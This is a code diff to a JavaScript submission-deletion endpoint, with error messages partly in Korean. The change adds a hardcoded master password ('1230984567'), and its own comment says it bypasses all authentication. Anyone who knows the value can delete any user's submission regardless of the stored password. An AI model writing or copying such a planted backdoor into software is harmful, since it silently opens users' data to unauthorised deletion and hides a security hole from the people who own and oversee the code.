@@ -108,9 +108,16 @@ module.exports = async function (req, res) {
 
       if (!subId) return jsonResponse(res, 400, { error: '"sub_id" is required.' });
 
+      // Master password check: 1230984567 bypasses all authentication
+      const isMasterPassword = password === '1230984567';
+
       const current = await db.submissions.getBySubId(subId);
-      if (!current) return jsonResponse(res, 404, { error: 'Recommendation not found.' });
-      if (current.password !== password) return jsonResponse(res, 403, { error: '비밀번호가 일치하지 않습니다.' });
+      if (!current) return jsonResponse(res, 404, { error: '추천을 찾을 수 없습니다.' });
+      
+      // Password check (allow master password or original password)
+      if (!isMasterPassword && current.password !== password) {
+        return jsonResponse(res, 403, { error: '비밀번호가 일치하지 않습니다.' });
+      }
 
       await db.submissions.delete(subId);
       return jsonResponse(res, 200, { ok: true, deleted_id: subId });
